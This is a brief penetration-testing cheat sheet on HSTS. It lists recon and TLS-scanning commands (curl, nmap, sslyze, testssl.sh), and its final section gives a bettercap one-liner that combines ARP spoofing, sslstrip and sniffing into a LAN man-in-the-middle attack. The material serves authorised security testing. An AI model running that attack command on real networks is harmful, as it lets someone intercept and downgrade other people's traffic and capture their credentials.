# HTTP Strict Transport Security

## Check List

* [ ] Review the HSTS header and its validity.

## Cheat Sheet

### Recon Header

#### [cURL](https://curl.se/)

```bash
curl -s -D- $WEBSITE | grep -i strict
```

#### [Nmap](https://nmap.org/)

```bash
nmap -sS -sV --mtu 5000 --script ssl-enum-ciphers $WEBSITE
```

### Scan Vulnerabilities

#### [sslyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze $WEBSITE
```

#### [testssl.sh](https://github.com/drwetter/testssl.sh)

```bash
testssl $WEBSITE
```

### MitM

#### [Bettercap](https://www.bettercap.org/)

{% hint style="info" %}
Interface Network
{% endhint %}

```bash
INTERFACE=$(ip -o -4 addr show | awk '{print $2}' | grep -v "lo" | head -n 1)
```

{% hint style="info" %}
MitM on LAN
{% endhint %}

```bash
bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGET; arp.spoof on; http.proxy on; http.proxy.sslstrip true; net.sniff on"
```
